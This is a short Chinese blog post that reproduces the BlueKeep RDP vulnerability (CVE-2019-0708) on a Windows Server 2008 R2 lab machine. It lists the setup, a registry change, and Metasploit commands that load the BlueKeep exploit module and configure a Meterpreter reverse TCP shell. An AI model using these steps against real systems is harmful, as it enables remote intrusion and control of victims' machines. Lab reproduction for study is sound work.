0x01前言

复现完了win7，现在来水一篇复现Windows Server 2008的,虽然比较鸡肋。


0x02漏洞介绍

Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广，漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。这个漏洞是今年来说危害严重性最大的漏洞，跟之前的勒索，永恒之蓝病毒差不多。


0x03环境

这里我使用的是 Microsoft Windows Server 2008 R2 Enterprise

开启远程桌面链接3389,在控制面板里面关闭防火墙


0x04复现

首先要修改注册表HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp\fDisableCam为 0(好鸡肋啊!!!)

然后启动msf使用模块exploit/rdp/cve_2019_0708_bluekeep_rce(没有配置模块的可以看看我前面的文章)

use exploit/rdp/cve_2019_0708_bluekeep_rce

配置参数  RDP_CLIENT_IP / RHOSTS / target / payload

set RDP_CLIENT_IP 192.168.0.121 //设置自己的ip
set RHOSTS 192.168.0.116 //设置靶机ip
set target 1//设置1
set payload windows/x64/meterpreter/reverse_tcp //设置payload
set lhost 192.168.0.121 //设置自己的ip
